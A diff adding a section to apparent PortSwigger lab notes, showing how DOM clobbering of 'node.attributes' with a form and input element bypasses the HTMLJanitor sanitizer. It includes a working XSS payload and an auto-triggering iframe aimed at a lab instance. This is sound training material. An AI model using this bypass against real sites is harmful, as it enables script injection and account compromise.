@@ -64,6 +64,50 @@ HTMLCollection(2) [a#defaultAvatar, a#defaultAvatar, defaultAvatar: a#defaultAv
 
 The `defaultAvatar` is successfully injected and the XSS is working!
 
+### DOM clobbering to bypass HTMLJanitor
+
+> Lab: [Clobbering DOM attributes to bypass HTML filters](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters)
+
+Snippet of the vulnerable code:
+
+```js
+// Sanitize attributes
+for (var a = 0; a < node.attributes.length; a += 1) {
+    var attr = node.attributes[a];
+
+    if (shouldRejectAttr(attr, allowedAttrs, node)) {
+        node.removeAttribute(attr.name);
+        // Shift the array to continue looping.
+        a = a - 1;
+    }
+}
+```
+
+You can use a `form` HTML element to inject the `attributes` attribute of any variables (in our example: `node`).
+
+```html
+<form id="anchor" tabindex="0" onfocus="print()">
+    <input id="attributes">
+</form>
+
+<!-- Use an iframe to auto trigger the XSS: -->
+<iframe src=https://0adf000f0387fa22c0ae1d2a00da005b.web-security-academy.net/post?postId=10
+    onload="setTimeout(()=>this.src=this.src + '#anchor',500)">
+```
+
+As you can see, the `node.attributes` is equals to the `input` element and the `node.attributes.length` variable is equals to `undefined` :
+
+```html
+> node
+<form id=​"anchor" tabindex=​"0" onfocus=​"print()​">​...​</form>​
+> node.attributes
+<input id=​"attributes">​
+> node.attributes.length
+undefined
+```
+
+This bypass the `HTMLJanitor` filter and trigger the XSS thanks to the `onfocus` event and the `iframe` that focus the anchor.
+
 ## Insecure deserialization
 
 ### Custom gadget chain for Java deserialization
